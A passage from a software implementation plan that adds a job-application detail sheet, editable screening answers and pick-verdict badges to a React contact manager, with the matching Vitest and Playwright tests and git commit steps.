  created_at: "2026-08-30T00:00:00Z", updated_at: "2026-08-30T00:00:00Z",
};

beforeEach(() => {
  toastErrorMock.mockClear();
  toastSuccessMock.mockClear();
  vi.stubGlobal(
    "fetch",
    vi.fn((url: string, opts?: RequestInit) => {
      if (typeof url === "string" && url.includes("/files")) {
        return Promise.resolve({
          ok: true,
          json: async () => ({ resume_url: null, cover_letter_url: null }),
        } as Response);
      }
      if (!opts || opts.method === undefined) {
        return Promise.resolve({
          ok: true,
          json: async () => ({
            applications: [
              ...sampleApplications,
              pickedApplication,
              blockedApplication,
              readyApplication,
            ],
          }),
        } as Response);
      }
      return Promise.resolve({
        ok: true,
        json: async () => ({ application: { ...sampleApplications[0], stage: "applied" } }),
      } as Response);
    })
  );
});
```

Then add a new `describe` block at the end of the file:

```tsx
describe("ApplicationsPage -- detail sheet (U1/U2)", () => {
  it("opens the detail sheet with job details when View is clicked", async () => {
    const user = userEvent.setup();
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    const row = screen.getByText("Ashby Co").closest("tr") as HTMLElement;
    await user.click(within(row).getByRole("button", { name: /view/i }));
    await waitFor(() => {
      expect(screen.getByTestId("sheet-content")).toBeInTheDocument();
    });
    expect(within(screen.getByTestId("sheet-content")).getByText("https://jobs.example/5")).toBeInTheDocument();
  });
});
```

- [ ] **Step 10: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: the new `"opens the detail sheet..."` test FAILs (no "View" button exists yet); every other test in the file still passes (the mock rewrite above is additive/compatible).

- [ ] **Step 11: Implement — add the View button and sheet to `ApplicationsPage.tsx`**

Full replacement of `contact-manager/src/components/ApplicationsPage.tsx`:

```tsx
"use client";

import { useEffect, useState, type FormEvent } from "react";
import { toast } from "sonner";
import { Badge } from "@/components/ui/Badge";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/Select";
import { ApplicationDetailSheet } from "@/components/ApplicationDetailSheet";
import {
  JOB_APPLICATION_STAGES,
  JOB_APPLICATION_STAGE_LABELS,
  type JobApplication,
  type JobApplicationStage,
} from "@/lib/types";

export function ApplicationsPage() {
  const [applications, setApplications] = useState<JobApplication[]>([]);
  const [loading, setLoading] = useState(true);
  const [company, setCompany] = useState("");
  const [role, setRole] = useState("");
  const [jobUrl, setJobUrl] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [selectedApplication, setSelectedApplication] = useState<JobApplication | null>(null);

  const load = async () => {
    try {
      const res = await fetch("/api/applications");
      const data = await res.json();
      setApplications(data.applications ?? []);
    } catch {
      toast.error("Could not load applications");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    load();
  }, []);

  const handleAdd = async (e: FormEvent) => {
    e.preventDefault();
    if (!company.trim() || !role.trim()) {
      toast.error("Company and role are required");
      return;
    }
    setSubmitting(true);
    try {
      const res = await fetch("/api/applications", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ company, role, job_url: jobUrl || undefined }),
      });
      if (!res.ok) throw new Error("request failed");
      const data = await res.json();
      setApplications((prev) => [data.application, ...prev]);
      setCompany("");
      setRole("");
      setJobUrl("");
      toast.success("Application added");
    } catch {
      toast.error("Could not add application");
    } finally {
      setSubmitting(false);
    }
  };

  const handleStageChange = async (id: string, stage: JobApplicationStage) => {
    const prev = applications;
    setApplications((cur) => cur.map((a) => (a.id === id ? { ...a, stage } : a)));
    try {
      const res = await fetch(`/api/applications/${id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ stage }),
      });
      if (!res.ok) throw new Error("request failed");
    } catch {
      setApplications(prev);
      toast.error("Could not update stage");
    }
  };

  const handleApprove = async (id: string) => {
    try {
      const res = await fetch(`/api/applications/${id}/submit`, { method: "POST" });
      if (!res.ok) throw new Error("request failed");
      toast.success("Submission triggered -- check back shortly");
    } catch {
      toast.error("Could not trigger submission");
    }
  };

  return (
    <div className="p-6 flex flex-col gap-6">
      <h1 className="text-lg font-medium text-fg">Applications</h1>

      <form onSubmit={handleAdd} className="flex flex-wrap items-end gap-3">
        <label className="flex flex-col gap-1 text-sm text-fg-muted">
          Company
          <input
            aria-label="Company"
            value={company}
            onChange={(e) => setCompany(e.target.value)}
            className="px-3 py-2 bg-surface-2 border border-border rounded-md text-sm text-fg"
          />
        </label>
        <label className="flex flex-col gap-1 text-sm text-fg-muted">
          Role
          <input
            aria-label="Role"
            value={role}
            onChange={(e) => setRole(e.target.value)}
            className="px-3 py-2 bg-surface-2 border border-border rounded-md text-sm text-fg"
          />
        </label>
        <label className="flex flex-col gap-1 text-sm text-fg-muted">
          Job URL
          <input
            aria-label="Job URL"
            value={jobUrl}
            onChange={(e) => setJobUrl(e.target.value)}
            className="px-3 py-2 bg-surface-2 border border-border rounded-md text-sm text-fg"
          />
        </label>
        <button
          type="submit"
          disabled={submitting}
          className="px-3 py-2 bg-indigo-600 text-white rounded-md text-sm disabled:opacity-50"
        >
          Add application
        </button>
      </form>

      {loading ? (
        <p className="text-sm text-fg-dim">Loading...</p>
      ) : applications.length === 0 ? (
        <p className="text-sm text-fg-dim">No applications yet.</p>
      ) : (
        <table className="w-full text-sm">
          <thead>
            <tr className="text-left text-fg-dim border-b border-border">
              <th className="py-2 pr-4">Company</th>
              <th className="py-2 pr-4">Role</th>
              <th className="py-2 pr-4">Stage</th>
              <th className="py-2 pr-4">Applied</th>
              <th className="py-2 pr-4">Pick</th>
              <th className="py-2 pr-4">Blocked</th>
              <th className="py-2 pr-4">Preview / Submit</th>
              <th className="py-2 pr-4">Details</th>
            </tr>
          </thead>
          <tbody>
            {applications.map((app) => (
              <tr key={app.id} className="border-b border-border">
                <td className="py-2 pr-4 text-fg">{app.company}</td>
                <td className="py-2 pr-4 text-fg-muted">{app.role}</td>
                <td className="py-2 pr-4">
                  <Select
                    value={app.stage}
                    onValueChange={(v) => handleStageChange(app.id, v as JobApplicationStage)}
                  >
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      {JOB_APPLICATION_STAGES.map((s) => (
                        <SelectItem key={s} value={s}>
                          {JOB_APPLICATION_STAGE_LABELS[s]}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </td>
                <td className="py-2 pr-4 text-fg-dim">{app.applied_date ?? <Badge>Not yet</Badge>}</td>
                <td className="py-2 pr-4">
                  {app.pick_verdict ? <Badge>{app.pick_verdict}</Badge> : <span className="text-fg-dim">—</span>}
                </td>
                <td className="py-2 pr-4 text-fg-dim">
                  {app.apply_blocked_reason ?? "—"}
                </td>
                <td className="py-2 pr-4">
                  {app.stage === "ready_to_submit" && app.apply_preview ? (
                    <div className="flex flex-col gap-1">
                      <span className="text-fg-dim text-xs">
                        {Object.entries(app.apply_preview.screening_answers).length} screening answer(s)
                      </span>
                      <button
                        type="button"
                        onClick={() => handleApprove(app.id)}
                        className="px-2 py-1 bg-emerald-600 text-white rounded-md text-xs w-fit"
                      >
                        Approve & Submit
                      </button>
                    </div>
                  ) : (
                    <span className="text-fg-dim">—</span>
                  )}
                </td>
                <td className="py-2 pr-4">
                  <button
                    type="button"
                    onClick={() => setSelectedApplication(app)}
                    className="px-2 py-1 bg-surface-2 text-fg-muted rounded-md text-xs border border-border hover:text-fg"
                  >
                    View
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}

      <ApplicationDetailSheet
        application={selectedApplication}
        onClose={() => setSelectedApplication(null)}
      />
    </div>
  );
}
```

- [ ] **Step 12: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: all tests PASS, including every pre-existing test in the file.

- [ ] **Step 13: Extend the e2e spec**

`contact-manager/tests/e2e/18-applications.spec.ts` — full replacement:

```ts
import { test, expect } from "@playwright/test";
import { mockSupabase } from "./helpers";

test.describe("Applications page", () => {
  test.beforeEach(async ({ page }) => {
    await mockSupabase(page);
    const applicationsHandler = async (route: import("@playwright/test").Route) => {
      if (route.request().method() === "GET") {
        await route.fulfill({
          status: 200,
          contentType: "application/json",
          body: JSON.stringify({
            applications: [
              { id: "1", contact_id: null, company: "Acme", role: "PM",
                job_url: "https://jobs.acme.example/1", source: "manual", source_channel: null,
                stage: "saved", applied_date: null, notes: null,
                posting_snapshot: { description: "Own the roadmap.", location: "Remote" },
                resume_file_ref: null, cover_letter_file_ref: null,
                resume_cost_usd: null, resume_tokens_input: null, resume_tokens_output: null,
                pick_verdict: null, pick_score: null, pick_reasoning: null,
                apply_preview: null, apply_blocked_reason: null, approved_at: null,
                created_at: "2026-08-26T00:00:00Z", updated_at: "2026-08-26T00:00:00Z" },
            ],
          }),
        });
      } else {
        await route.continue();
      }
    };
    // M10: Playwright's page.route() glob matching does NOT automatically match a URL that has
    // a query string appended to the base path -- register both forms so a later task's
    // ?stage=/?source= fetches (Task 6's filters, Task 7's polling) are covered by the exact
    // same handler regardless of whether Playwright's glob semantics would otherwise miss the
    // querystring variant. Cheap insurance either way.
    await page.route("**/api/applications", applicationsHandler);
    await page.route("**/api/applications?*", applicationsHandler);
    await page.route("**/api/applications/1/files", async (route) => {
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({
          resume_url: null,
          resume_error: false,
          cover_letter_url: null,
          cover_letter_error: false,
        }),
      });
    });
    await page.route("**/api/system-health", async (route) => {
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({ health: [] }),
      });
    });
  });

  test("shows the applications table and nav link", async ({ page }) => {
    await page.goto("/applications");
    await expect(page.getByRole("link", { name: "Applications" })).toBeVisible();
    await expect(page.getByText("Acme")).toBeVisible();
    await page.screenshot({ path: "tests/e2e/screenshots/18-applications.png" });
  });

  test("opens the detail sheet and shows job details on View click", async ({ page }) => {
    await page.goto("/applications");
    await page.getByRole("button", { name: "View" }).click();
    await expect(page.getByText("Own the roadmap.")).toBeVisible();
    await expect(page.getByText("Remote")).toBeVisible();
    await expect(page.getByText("No resume on file yet.")).toBeVisible();
    await page.screenshot({ path: "tests/e2e/screenshots/18-applications-detail-sheet.png" });
  });
});
```

Note: this adds a `**/api/system-health` route stub in `beforeEach` even though `SystemHealthStrip` isn't wired into the page until Task 9 — added now so this file doesn't need another full rewrite later purely to add that stub; it is a harmless no-op until Task 9.

- [ ] **Step 14: Run the e2e suite, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx playwright test tests/e2e/18-applications.spec.ts`
Expected: both tests PASS. Read `tests/e2e/screenshots/18-applications-detail-sheet.png` after the run and confirm it visually shows the open sheet with the job description and "No resume on file yet." text.

- [ ] **Step 15: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add contact-manager/src/app/api/applications/[id]/files contact-manager/src/components/ApplicationDetailSheet.tsx contact-manager/src/components/ApplicationDetailSheet.test.tsx contact-manager/src/components/ApplicationsPage.tsx contact-manager/src/components/ApplicationsPage.test.tsx contact-manager/tests/e2e/18-applications.spec.ts && git commit -m "$(cat <<'EOF'
feat(applications): detail sheet with job + resume sections (U1/U2)

New ApplicationDetailSheet.tsx (Vaul-based, mirrors the contact sheet
primitive) opens from a per-row View button. Renders job_url and every
present posting_snapshot text field (description, responsibilities,
qualifications, benefits, location), and the resume/cover letter as
inline iframes fed by signed URLs from a new
GET /api/applications/[id]/files route -- no new npm dependency, PDFs
render natively in an iframe.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

### Task 4: Apply-preview section + editable answers (U3/U11 frontend)

**Files:**
- Modify: `contact-manager/src/components/ApplicationDetailSheet.tsx`
- Modify: `contact-manager/src/components/ApplicationDetailSheet.test.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.test.tsx`

**Interfaces:**
- Consumes: `PATCH /api/applications/[id]` accepting `apply_preview` from Task 2.
- Produces: `ApplicationDetailSheet` gains an optional `onSaved?: (app: JobApplication) => void` prop (I7), called with the PATCH response's `application` object on a successful save so the caller can keep its own state in sync — `ApplicationsPage.tsx` wires this to update both `applications` and `selectedApplication`, otherwise a saved edit silently goes stale in the table and on the next sheet open/re-render (defeating U11's whole point: the human's edit should be what actually gets submitted).

**Context on why this matters now (record for the plan, not stale):** the spec's original rationale for U11 ("submit regenerates answers instead of reusing approved ones") is stale — that follow-up was already fixed: `apply_agent.py`'s `submit()` now replays `job["apply_preview"]`'s stored answers verbatim, never regenerates them (see `apply_agent.py:412-414`, and `tests/test_apply_agent.py::test_submit_fills_screening_and_eligibility_from_the_stored_preview_not_regenerated`). This makes U11 more valuable, not less: because `submit()` already faithfully replays whatever is stored in `apply_preview`, an edit-and-save on that JSON here is now guaranteed to actually reach the real submission.

- [ ] **Step 1: Write the failing test**

`contact-manager/src/components/ApplicationDetailSheet.test.tsx` — add near the top, after the `baseApplication` export, a `sonner` mock (needed once `handleSaveAnswers` calls `toast`):

```tsx
vi.mock("sonner", () => ({
  toast: { success: vi.fn(), error: vi.fn() },
}));
```

Update `beforeEach`'s fetch stub to also answer a `PATCH` by echoing back a merged application
object (needed so the `onSaved` tests below can assert on a realistic response body, not an
empty `{}`):

```tsx
beforeEach(() => {
  vi.stubGlobal(
    "fetch",
    vi.fn((url: string, opts?: RequestInit) => {
      if (typeof url === "string" && url.includes("/files")) {
        return Promise.resolve({
          ok: true,
          json: async () => ({
            resume_url: "https://signed.example/resume.pdf",
            resume_error: false,
            cover_letter_url: null,
            cover_letter_error: false,
          }),
        } as Response);
      }
      if (opts?.method === "PATCH") {
        const patchBody = JSON.parse((opts.body as string) ?? "{}");
        return Promise.resolve({
          ok: true,
          json: async () => ({ application: { ...baseApplication, ...patchBody } }),
        } as Response);
      }
      return Promise.resolve({ ok: true, json: async () => ({ application: {} }) } as Response);
    })
  );
});
```

Add a new `describe` block at the end of the file:

```tsx
describe("ApplicationDetailSheet -- apply preview (U3/U11)", () => {
  const appWithAnswers: JobApplication = {
    ...baseApplication,
    apply_preview: {
      platform: "ashby",
      field_values: { name: "Kishore" },
      eligibility_answers: { "Authorized to work in the US?": "Yes" },
      screening_answers: { "Why this role?": "Because of the mission." },
    },
  };

  it("renders the platform and field values", async () => {
    render(<ApplicationDetailSheet application={appWithAnswers} onClose={() => {}} />);
    expect(screen.getByText(/ashby/i)).toBeInTheDocument();
    expect(screen.getByText(/Kishore/)).toBeInTheDocument();
  });

  it("renders screening and eligibility answers as editable fields", async () => {
    render(<ApplicationDetailSheet application={appWithAnswers} onClose={() => {}} />);
    expect(await screen.findByDisplayValue("Because of the mission.")).toBeInTheDocument();
    expect(screen.getByDisplayValue("Yes")).toBeInTheDocument();
  });

  it("edits a screening answer and saves it via PATCH with the merged apply_preview", async () => {
    const user = userEvent.setup();
    render(<ApplicationDetailSheet application={appWithAnswers} onClose={() => {}} />);
    const textarea = await screen.findByDisplayValue("Because of the mission.");
    await user.clear(textarea);
    await user.type(textarea, "Because I love the product.");
    await user.click(screen.getByRole("button", { name: /save changes/i }));

    await waitFor(() => {
      const patchCall = (global.fetch as ReturnType<typeof vi.fn>).mock.calls.find(
        ([url, opts]) => url === "/api/applications/5" && (opts as RequestInit | undefined)?.method === "PATCH"
      );
      expect(patchCall).toBeDefined();
      const body = JSON.parse((patchCall![1] as RequestInit).body as string);
      expect(body.apply_preview.screening_answers["Why this role?"]).toBe("Because I love the product.");
      expect(body.apply_preview.eligibility_answers["Authorized to work in the US?"]).toBe("Yes");
      expect(body.apply_preview.platform).toBe("ashby");
    });
  });

  it("shows a placeholder when there is no apply_preview yet", () => {
    render(
      <ApplicationDetailSheet application={{ ...baseApplication, apply_preview: null }} onClose={() => {}} />
    );
    expect(screen.getByText("No application preview yet.")).toBeInTheDocument();
  });

  it("calls onSaved with the PATCH response's application on a successful save (I7)", async () => {
    const user = userEvent.setup();
    const onSaved = vi.fn();
    render(<ApplicationDetailSheet application={appWithAnswers} onClose={() => {}} onSaved={onSaved} />);
    const textarea = await screen.findByDisplayValue("Because of the mission.");
    await user.clear(textarea);
    await user.type(textarea, "Because I love the product.");
    await user.click(screen.getByRole("button", { name: /save changes/i }));

    await waitFor(() => {
      expect(onSaved).toHaveBeenCalledWith(
        expect.objectContaining({
          apply_preview: expect.objectContaining({
            screening_answers: expect.objectContaining({ "Why this role?": "Because I love the product." }),
          }),
        })
      );
    });
  });

  it("reflects the saved answer once the parent re-renders with the onSaved value, not the stale original (I7)", async () => {
    const user = userEvent.setup();
    let current = appWithAnswers;
    const onSaved = vi.fn((updated: JobApplication) => {
      current = updated;
    });
    const { rerender } = render(
      <ApplicationDetailSheet application={current} onClose={() => {}} onSaved={onSaved} />
    );
    const textarea = await screen.findByDisplayValue("Because of the mission.");
    await user.clear(textarea);
    await user.type(textarea, "Because I love the product.");
    await user.click(screen.getByRole("button", { name: /save changes/i }));
    await waitFor(() => expect(onSaved).toHaveBeenCalled());

    rerender(<ApplicationDetailSheet application={current} onClose={() => {}} onSaved={onSaved} />);
    expect(screen.getByDisplayValue("Because I love the product.")).toBeInTheDocument();
    expect(screen.queryByDisplayValue("Because of the mission.")).not.toBeInTheDocument();
  });
});
```

Add `import userEvent from "@testing-library/user-event";` to the file's import block (alongside the existing `render, screen, waitFor` import).

- [ ] **Step 2: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationDetailSheet.test.tsx`
Expected: FAIL — the apply-preview section doesn't exist yet.

- [ ] **Step 3: Implement — add the apply-preview section to `ApplicationDetailSheet.tsx`**

Add `import { toast } from "sonner";` to the top imports. Change the component's prop signature
(defined in Task 3) from:

```tsx
export function ApplicationDetailSheet({
  application,
  onClose,
}: {
  application: JobApplication | null;
  onClose: () => void;
}) {
```

to (I7 — `onSaved` is optional so every existing call site across Tasks 3/5's tests keeps
compiling unchanged; only `ApplicationsPage.tsx`, wired below, and this task's new tests pass
it):

```tsx
export function ApplicationDetailSheet({
  application,
  onClose,
  onSaved,
}: {
  application: JobApplication | null;
  onClose: () => void;
  onSaved?: (app: JobApplication) => void;
}) {
```

Add a new helper function above the component:

```tsx
function AnswerEditor({
  title,
  answers,
  multiline,
  onChange,
}: {
  title: string;
  answers: Record<string, string>;
  multiline: boolean;
  onChange: (key: string, value: string) => void;
}) {
  const entries = Object.entries(answers);
  if (entries.length === 0) {
    return (
      <div>
        <p className="text-xs text-fg-dim uppercase tracking-wide">{title}</p>
        <p className="text-sm text-fg-dim">None.</p>
      </div>
    );
  }
  return (
    <div className="flex flex-col gap-2">
      <p className="text-xs text-fg-dim uppercase tracking-wide">{title}</p>
      {entries.map(([question, value]) =>
        multiline ? (
          <label key={question} className="flex flex-col gap-1 text-sm">
            <span className="text-fg-muted">{question}</span>
            <textarea
              value={value}
              onChange={(e) => onChange(question, e.target.value)}
              className="px-2 py-1 bg-surface-2 border border-border rounded-md text-sm text-fg min-h-[60px]"
            />
          </label>
        ) : (
          <label key={question} className="flex flex-col gap-1 text-sm">
            <span className="text-fg-muted">{question}</span>
            <input
              value={value}
              onChange={(e) => onChange(question, e.target.value)}
              className="px-2 py-1 bg-surface-2 border border-border rounded-md text-sm text-fg"
            />
          </label>
        )
      )}
    </div>
  );
}
```

Inside the `ApplicationDetailSheet` component, add state and a save handler right after the `files`/`filesLoading` state:

```tsx
  const [screeningAnswers, setScreeningAnswers] = useState<Record<string, string>>({});
  const [eligibilityAnswers, setEligibilityAnswers] = useState<Record<string, string>>({});
  const [savingAnswers, setSavingAnswers] = useState(false);

  useEffect(() => {
    setScreeningAnswers(application?.apply_preview?.screening_answers ?? {});
    setEligibilityAnswers(application?.apply_preview?.eligibility_answers ?? {});
  }, [application?.id, application?.apply_preview]);

  const handleSaveAnswers = async () => {
    if (!application || !application.apply_preview) return;
    setSavingAnswers(true);
    try {
      const res = await fetch(`/api/applications/${application.id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          apply_preview: {
            ...application.apply_preview,
            screening_answers: screeningAnswers,
            eligibility_answers: eligibilityAnswers,
          },
        }),
      });
      if (!res.ok) throw new Error("request failed");
      const data = await res.json();
      toast.success("Answers saved");
      // I7: without this, a successful save updates the database but the table's answer
      // count and a re-opened/re-rendered sheet both keep showing the pre-edit data --
      // defeating U11's entire point (the human's edit should be what actually gets
      // submitted, and they should be able to SEE that it was saved).
      if (data.application) onSaved?.(data.application as JobApplication);
    } catch {
      toast.error("Could not save answers");
    } finally {
      setSavingAnswers(false);
    }
  };
```

Add a new `<section>` inside `SheetBody`'s flex column, immediately after the "Cover letter" section:

```tsx
                <section>
                  <h3 className="text-sm font-medium text-fg mb-2">Application preview</h3>
                  {application.apply_preview ? (
                    <div className="flex flex-col gap-4">
                      <p className="text-sm text-fg-muted">Platform: {application.apply_preview.platform}</p>
                      <div>
                        <p className="text-xs text-fg-dim uppercase tracking-wide">Field values</p>
                        <div className="flex flex-col gap-1 mt-1">
                          {Object.entries(application.apply_preview.field_values).map(([k, v]) => (
                            <p key={k} className="text-sm text-fg-muted">
                              <span className="text-fg-dim">{k}:</span> {v}
                            </p>
                          ))}
                        </div>
                      </div>
                      <AnswerEditor
                        title="Eligibility answers"
                        answers={eligibilityAnswers}
                        multiline={false}
                        onChange={(k, v) => setEligibilityAnswers((cur) => ({ ...cur, [k]: v }))}
                      />
                      <AnswerEditor
                        title="Screening answers"
                        answers={screeningAnswers}
                        multiline={true}
                        onChange={(k, v) => setScreeningAnswers((cur) => ({ ...cur, [k]: v }))}
                      />
                      <button
                        type="button"
                        onClick={handleSaveAnswers}
                        disabled={savingAnswers}
                        className="px-3 py-2 bg-indigo-600 text-white rounded-md text-sm w-fit disabled:opacity-50"
                      >
                        {savingAnswers ? "Saving..." : "Save changes"}
                      </button>
                    </div>
                  ) : (
                    <p className="text-fg-dim text-sm">No application preview yet.</p>
                  )}
                </section>
```

- [ ] **Step 4: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationDetailSheet.test.tsx`
Expected: all tests PASS, including every test from Task 3.

- [ ] **Step 4b: Write the failing test for propagation into `ApplicationsPage.tsx` (I7)**

`contact-manager/src/components/ApplicationsPage.test.tsx` — the `beforeEach` fetch stub's final
fallback branch (from Task 3's Step 9) answers every non-GET, non-`/files` request with the same
canned `{ application: { ...sampleApplications[0], stage: "applied" } }` body, which doesn't
reflect an `apply_preview` edit. Change that fallback to:

```tsx
      if (opts?.method === "PATCH" && typeof opts.body === "string") {
        const patchBody = JSON.parse(opts.body);
        if (patchBody.apply_preview) {
          return Promise.resolve({
            ok: true,
            json: async () => ({ application: { ...readyApplication, ...patchBody } }),
          } as Response);
        }
      }
      return Promise.resolve({
        ok: true,
        json: async () => ({ application: { ...sampleApplications[0], stage: "applied" } }),
      } as Response);
```

(replacing the plain `return Promise.resolve({ ok: true, json: async () => ({ application: { ...sampleApplications[0], stage: "applied" } }) } as Response);` line that currently ends the mock function.) Add a new `describe` block at the end of the file:

```tsx
describe("ApplicationsPage -- apply-preview save propagates to the table (I7)", () => {
  it("updates the table's screening-answer count after Save changes in the sheet", async () => {
    const user = userEvent.setup();
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    const row = screen.getByText("Ashby Co").closest("tr") as HTMLElement;
    await user.click(within(row).getByRole("button", { name: /view/i }));
    const sheet = await screen.findByTestId("sheet-content");
    const textarea = await within(sheet).findByDisplayValue("Because of the mission.");
    await user.clear(textarea);
    await user.type(textarea, "Because I love the product.");
    await user.click(within(sheet).getByRole("button", { name: /save changes/i }));

    await waitFor(() => {
      expect(within(row).getByText("1 screening answer(s)")).toBeInTheDocument();
    });
    // The count text existed before the save too (readyApplication already had one answer) --
    // the real assertion is that a second edit-and-save cycle starts from the saved value, not
    // the original. Re-open the sheet and confirm the textarea now shows the saved text.
    await user.click(within(row).getByRole("button", { name: /view/i }));
    expect(
      await within(await screen.findByTestId("sheet-content")).findByDisplayValue(
        "Because I love the product."
      )
    ).toBeInTheDocument();
  });
});
```

- [ ] **Step 4c: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: FAIL — `ApplicationsPage.tsx` doesn't pass `onSaved` yet, so a save never updates
`applications` or `selectedApplication`; re-opening the sheet still shows the pre-edit text.

- [ ] **Step 4d: Implement — wire `onSaved` in `ApplicationsPage.tsx`**

Add a handler right after `handleApprove` (or wherever the other handlers are grouped):

```tsx
  const handleApplicationSaved = (updated: JobApplication) => {
    setApplications((cur) => cur.map((a) => (a.id === updated.id ? updated : a)));
    setSelectedApplication(updated);
  };
```

Change:

```tsx
      <ApplicationDetailSheet
        application={selectedApplication}
        onClose={() => setSelectedApplication(null)}
      />
```

to:

```tsx
      <ApplicationDetailSheet
        application={selectedApplication}
        onClose={() => setSelectedApplication(null)}
        onSaved={handleApplicationSaved}
      />
```

- [ ] **Step 4e: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: all tests PASS.

- [ ] **Step 5: Run the full vitest suite**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npm test`
Expected: 0 failures.

- [ ] **Step 6: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add contact-manager/src/components/ApplicationDetailSheet.tsx contact-manager/src/components/ApplicationDetailSheet.test.tsx contact-manager/src/components/ApplicationsPage.tsx contact-manager/src/components/ApplicationsPage.test.tsx && git commit -m "$(cat <<'EOF'
feat(applications): editable apply-preview section in the detail sheet (U3/U11)

Renders platform, field_values, and both answer sets as labeled fields
in the detail sheet, with eligibility answers as single-line inputs and
screening answers as textareas. Save changes PATCHes the merged
apply_preview -- since apply_agent.py's submit() already replays
apply_preview's stored answers verbatim (a prior fix, not new to this
task), an edit here is now guaranteed to reach the real submission.

ApplicationDetailSheet also gains an optional onSaved callback, called
with the PATCH response's application on a successful save.
ApplicationsPage wires it to update both its applications list and
selectedApplication state -- without this, a saved edit updated the
database but the table's answer count and a re-opened sheet both kept
showing the pre-edit data.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

### Task 5: Pick section, cost section, badge colors (U6/U9/U15)

**Files:**
- Create: `contact-manager/src/lib/applicationBadges.ts`
- Create: `contact-manager/src/lib/applicationBadges.test.ts`
- Modify: `contact-manager/src/components/ui/Badge.tsx`
- Modify: `contact-manager/src/components/ApplicationDetailSheet.tsx`
- Modify: `contact-manager/src/components/ApplicationDetailSheet.test.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.test.tsx`

**Interfaces:**
- Produces: `pickVerdictVariant(verdict: JobApplicationPickVerdict | null): BadgeVariant`, exported from `contact-manager/src/lib/applicationBadges.ts`, imported by both `ApplicationsPage.tsx` (table badge) and `ApplicationDetailSheet.tsx` (pick section badge).

- [ ] **Step 1: Write the failing test for the badge-variant helper**

`contact-manager/src/lib/applicationBadges.test.ts`:

```ts
import { describe, it, expect } from "vitest";
import { pickVerdictVariant } from "./applicationBadges";

describe("pickVerdictVariant", () => {
  it("maps strong to emerald", () => {
    expect(pickVerdictVariant("strong")).toBe("emerald");
  });
  it("maps maybe to amber", () => {
    expect(pickVerdictVariant("maybe")).toBe("amber");
  });
  it("maps no to red", () => {
    expect(pickVerdictVariant("no")).toBe("red");
  });
  it("maps null to default", () => {
    expect(pickVerdictVariant(null)).toBe("default");
  });
});
```

- [ ] **Step 2: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/lib/applicationBadges.test.ts`
Expected: FAIL — `./applicationBadges` doesn't exist yet.

- [ ] **Step 3: Export `BadgeVariant` from `Badge.tsx`, then implement `applicationBadges.ts`**

In `contact-manager/src/components/ui/Badge.tsx`, change:

```ts
type BadgeVariant = "default" | "indigo" | "emerald" | "amber" | "red" | "muted";
```

to:

```ts
export type BadgeVariant = "default" | "indigo" | "emerald" | "amber" | "red" | "muted";
```

`contact-manager/src/lib/applicationBadges.ts`:

```ts
import type { JobApplicationPickVerdict } from "@/lib/types";
import type { BadgeVariant } from "@/components/ui/Badge";

export function pickVerdictVariant(verdict: JobApplicationPickVerdict | null): BadgeVariant {
  if (verdict === "strong") return "emerald";
  if (verdict === "maybe") return "amber";
  if (verdict === "no") return "red";
  return "default";
}
```

- [ ] **Step 4: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/lib/applicationBadges.test.ts`
Expected: all 4 tests PASS.

- [ ] **Step 5: Write the failing tests for the pick + cost sections**

`contact-manager/src/components/ApplicationDetailSheet.test.tsx` — add a new `describe` block at the end of the file:

```tsx
describe("ApplicationDetailSheet -- pick and cost sections (U6/U9/U15)", () => {
  it("renders the pick verdict badge, score, and full reasoning", async () => {
    render(<ApplicationDetailSheet application={baseApplication} onClose={() => {}} />);
    expect(screen.getByText("strong")).toBeInTheDocument();
    expect(screen.getByText(/0\.9/)).toBeInTheDocument();
    expect(screen.getByText("Great fit.")).toBeInTheDocument();
  });

  it("shows a not-yet-scored placeholder when pick_verdict is null", () => {
    render(
